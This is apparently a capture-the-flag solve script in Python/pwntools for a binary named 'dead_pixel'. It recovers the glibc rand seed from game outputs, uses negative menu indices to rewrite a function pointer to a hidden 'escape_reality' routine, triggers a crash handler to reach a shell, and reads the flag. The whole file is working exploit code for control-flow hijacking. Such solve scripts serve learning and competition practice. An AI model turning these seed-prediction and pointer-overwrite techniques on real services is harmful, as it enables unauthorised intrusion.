#!/usr/bin/env python3
from pwn import *
import re
import sys

context.binary = ELF("./dead_pixel", checksec=False)
context.log_level = "info"

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 5000)

if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = process("./dead_pixel")


PROMPT = b"5. BREAK FOURTH WALL\n> "

energy_re = re.compile(rb"\[Glitch Energy\]:\s*(-?\d+)\.")
mem_re = re.compile(rb"\[Memory Integrity\]:\s*(-?\d+)\.")


def glibc_rand_seq(seed, n):
    if seed == 0:
        seed = 1

    r = [0] * (344 + n)
    r[0] = seed & 0xffffffff

    for i in range(1, 31):
        r[i] = (16807 * r[i - 1]) % 2147483647

    for i in range(31, 34):
        r[i] = r[i - 31]

    for i in range(34, 344 + n):
        r[i] = (r[i - 31] + r[i - 3]) & 0xffffffff

    return [(r[i] >> 1) & 0x7fffffff for i in range(344, 344 + n)]


def upd(stream, pos):
    r1, r2 = stream[pos], stream[pos + 1]
    if r1 & 1:
        return -(r2 & 0xff)
    return r2 & 0xff


def mem_norm(stream, pos):
    r1 = stream[pos]
    if r1 & 1:
        return -(r1 % 10)
    return r1 % 10


def mem_choice102_delta(stream, pos):
    return upd(stream, pos) + mem_norm(stream, pos)


def find_delta_plan(stream, start, target, sign, window=50000):
    """
    Finds positions where corrupt_data update deltas sum to target.
    sign = -1 means use negative deltas.
    sign = +1 means use positive deltas.
    """
    states = {0: (start, [])}

    for p in range(start, start + window):
        d = upd(stream, p)

        if sign * d <= 0:
            continue

        val = abs(d)
        snapshot = list(states.items())

        for s, (minpos, path) in snapshot:
            if p < minpos:
                continue

            ns = s + val

            if ns > target:
                continue

            if ns not in states or p + 3 < states[ns][0]:
                states[ns] = (p + 3, path + [p])

        if target in states:
            return states[target][1]

    return None


def find_mem_lower_plan(stream, start, end, targets):
    """
    Finds choice -102 calls before `end` that lower memory by one of `targets`.
    """
    targets = set(targets)
    max_target = max(targets)

    states = {0: (start, [])}

    for p in range(start, end):
        d = mem_choice102_delta(stream, p)

        if d >= 0:
            continue

        val = -d
        snapshot = list(states.items())

        for s, (minpos, path) in snapshot:
            if p < minpos:
                continue

            ns = s + val

            if ns > max_target:
                continue

            if ns not in states or p + 3 < states[ns][0]:
                states[ns] = (p + 3, path + [p])

        hit = targets.intersection(states.keys())
        if hit:
            h = next(iter(hit))
            return h, states[h][1]

    return None, None


idx = 0
mem = -100
energy = 500


def recv_menu():
    return io.recvuntil(PROMPT)


def parse_energy(out):
    return int(energy_re.findall(out)[-1])


def parse_mem(out):
    m = mem_re.findall(out)
    if not m:
        return None
    return int(m[-1])


recv_menu()


# ------------------------------------------------------------
# Step 1: infer 16-bit srand seed
# ------------------------------------------------------------

cands = list(range(65536))
obs = []

while len(cands) > 1 or len(obs) < 6:
    io.sendline(b"2")
    out = recv_menu()

    new_energy = parse_energy(out)
    delta = energy - new_energy
    energy = new_energy

    obs.append(delta)
    idx += 1

    new_cands = []
    for s in cands:
        seq = glibc_rand_seq(s, len(obs))
        if all(seq[i] % 10 == obs[i] for i in range(len(obs))):
            new_cands.append(s)

    cands = new_cands
    log.info(f"obs={obs}, candidates={len(cands)}")

seed = cands[0]
stream = glibc_rand_seq(seed, 300000)

log.success(f"seed = {seed}")


# ------------------------------------------------------------
# Actions
# ------------------------------------------------------------

def act2():
    global idx

    io.sendline(b"2")
    recv_menu()
    idx += 1


def act3():
    """
    OVERFLOW BUFFER.
    Returns True if ACK happened.
    """
    global idx, mem

    io.sendline(b"3")
    io.recvuntil(b"Target address:")
    io.sendline(b"A")
    io.recvuntil(b"Payload:")
    io.sendline(b"B")

    out = recv_menu()

    r = stream[idx]
    idx += 1

    ack = (r % 10 == 0)

    if ack:
        idx += 1

    real = b"ACK: engine accepted" in out
    assert real == ack

    pm = parse_mem(out)
    if pm is not None:
        mem = pm

    return ack


def act1(choice):
    """
    CORRUPT DATA.
    """
    global idx, mem

    io.sendline(b"1")
    io.recvuntil(b"Select packet:")
    io.sendline(str(choice).encode())

    out = recv_menu()

    if b"corruption cascade" in out:
        log.failure(f"crashed at choice={choice}, idx={idx}")
        sys.exit(1)

    d = upd(stream, idx)
    mn = mem_norm(stream, idx)

    if choice == -102:
        mem += d + mn
    else:
        mem += mn

    idx += 3

    pm = parse_mem(out)
    if pm is not None:
        mem = pm

    return d


# ------------------------------------------------------------
# Step 2: create packet_log[6]
# ------------------------------------------------------------

want_j = 6
ack_count = 0

sig_offsets = [
    0x2a40,  # 0xDEADBEEF
    0x2a4b,  # heap_spray?
    0x2a57,  # use-after-free
    0x2a66,  # double_free
    0x2a72,  # rop_chain
    0x2a7c,  # format_string
]

sig_off = None

while ack_count <= want_j:
    if act3():
        sig_index = stream[idx - 1] % 6
        sig_off = sig_offsets[sig_index]

        log.info(f"ACK {ack_count}: sig={hex(sig_off)}")

        ack_count += 1

log.success(f"packet_log[6] = PIE + {hex(sig_off)}")


# ------------------------------------------------------------
# Step 3: boost memory so pointer editing will not kill us
# ------------------------------------------------------------

def next_update(choice, sign):
    global idx

    while sign * upd(stream, idx) <= 0:
        act2()

    return act1(choice)


while mem < 2500:
    d = next_update(-102, +1)
    log.info(f"boost memory: d={d}, mem={mem}")


# ------------------------------------------------------------
# Step 4: packet_log[6] -> escape_reality
# ------------------------------------------------------------

escape_reality = 0x133d
need = sig_off - escape_reality

log.info(f"need packet_log[6] delta = {-need}")

plan = find_delta_plan(stream, idx, need, sign=-1)

if plan is None:
    log.failure("could not find packet_log plan")
    sys.exit(1)

log.success(f"packet plan length = {len(plan)}")

for p in plan:
    while idx < p:
        act2()

    d = act1(-10)       # corruption_table[-10] == packet_log[6]
    assert d < 0

log.success("packet_log[6] now points to escape_reality")


# ------------------------------------------------------------
# Step 5: lower memory and prepare final render_stage=-30
# ------------------------------------------------------------

final = None

for F in range(idx, idx + 100000):
    if upd(stream, F) == -31 and (stream[F] % 10) > 0:
        dm = stream[F] % 10

        # After final call, memory becomes before - dm.
        # Need before >= -200 and before - dm < -200.
        befores = range(-200, -200 + dm)

        amounts = [mem - b for b in befores if mem - b >= 0]

        if not amounts:
            continue

        amount, lower_plan = find_mem_lower_plan(stream, idx, F, amounts)

        if lower_plan is not None:
            before = mem - amount
            final = (F, dm, before, lower_plan)
            break

if final is None:
    log.failure("could not find final plan")
    sys.exit(1)

F, dm, before, lower_plan = final

log.success(f"final rand position={F}, memory before final={before}, dm={dm}")


for p in lower_plan:
    while idx < p:
        act2()

    d = act1(-102)
    assert d < 0

log.info(f"memory before final = {mem}")

while idx < F:
    act2()


# ------------------------------------------------------------
# Step 6: final trigger
# ------------------------------------------------------------
#
# choice -103 writes render_stage.
# corrupt_data sets render_stage = 1 first.
# We need 1 - 31 = -30.
#
# Then memory drops below -200.
# run_game() calls glitch_out().
# SIGSEGV handler uses pixel_handlers[-30] == packet_log[6].
# packet_log[6] == escape_reality.
#
context.terminal = ["foot", "-e", "sh", "-c"]

def GDB():
    if not args.REMOTE:
        gdb.attach(io, gdbscript='''
        # b*overflow_buffer()+354
        b*0x555555554af8
        # inside escapse reality
        b*0x555555554f0c
        b*0x5555555545ed
        c
        ''')
        sleep(1)

io.sendline(b"1")
io.recvuntil(b"Select packet:")
GDB()

io.sendline(b"-103")



log.success("triggered; switching to shell")

io.sendline(b"cat flag")
io.interactive()